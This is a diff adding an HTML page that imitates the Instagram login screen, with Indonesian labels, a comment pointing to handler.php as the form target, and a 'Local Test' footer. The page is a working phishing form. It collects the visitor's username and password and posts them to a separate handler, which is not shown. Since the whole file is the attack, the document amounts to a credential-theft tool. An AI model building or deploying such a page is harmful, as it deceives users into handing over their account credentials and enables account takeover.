@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
+        .box { border: 1px solid #dbdbdb; padding: 40px; background: white; width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 5px; background: #fafafa; border: 1px solid #dbdbdb; }
+        button { background: #0095f6; color: white; padding: 8px 20px; border: none; border-radius: 8px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Instagram</h2>
+        <!-- PERHATIKAN ACTIONNYA MENGARAH KE handler.php -->
+        <form action="handler.php" method="POST">
+            <input type="text" name="username" placeholder="Nomor telepon, nama pengguna, atau email" required>
+            <input type="password" name="password" placeholder="Kata sandi" required>
+            <button type="submit">Masuk</button>
+        </form>
+        <p style="font-size:12px; color:grey; margin-top:20px;">DYL4N - Local Test</p>
+    </div>
+</body>
+</html>
